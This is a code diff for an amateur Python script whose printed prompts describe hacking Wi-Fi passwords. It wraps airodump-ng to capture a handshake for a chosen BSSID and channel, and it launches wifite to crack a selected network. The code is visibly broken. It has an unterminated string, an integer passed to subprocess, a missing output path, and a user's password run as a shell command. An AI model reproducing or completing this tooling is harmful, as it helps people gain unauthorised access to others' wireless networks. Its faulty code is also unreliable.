@@ -40,9 +40,20 @@ if a == 1:
 
    print(ex1)
 
-   print("Enter Bssid of The Network To Hack The Wifi Password")
+   print("Find Bssid of The Network To Hack The Wifi Password in Row Bssid\n")
+   
+   bssid = input("ENter Bssid Here:- ")
+   
+   print("Find Channel of The Network To Hack The Wifi Password in Row ch\n")
 
-   s3 = subprocess.call([])
+   channel = int(input("Enter Channel Here:-"))
+   
+   s3 = subprocess.call(["airodump-ng", interface],shell=True)
+   print(s3)
+   
+   path = input("Enter Path of SToring The Handshake File
+              ")
+   s4 = subprocess.call(["airodump-ng ","--bssid ", bssid, " --channel ",channel," -w", ])
    
 elif a == 2:
    print("Programming code for Wifi Hacking Second Method")
@@ -54,11 +65,16 @@ elif a == 2:
    passwd = input("Enter Password For Root access:-")
    d2 = subprocess.call([passwd],shell=True)
    print(d2)
+   
    d3 = subprocess.call([wifite],shell=True)
    print(d3)
+   
    print("Press Ctrl^C To stop The Scanning For The wifi Networks.")
-   d4 = int(input("ENter Number To select The Network:-"))
-   d5 = subprocess.call([d4],shell=True)   
+   d4 = int(input("Enter Number To select The Network:-"))
+   d5 = subprocess.call([d4],shell=True)
+   
+   print("It will Automatically Exit The Code While Layouting The Password!")
+   break
    
 else:
    break
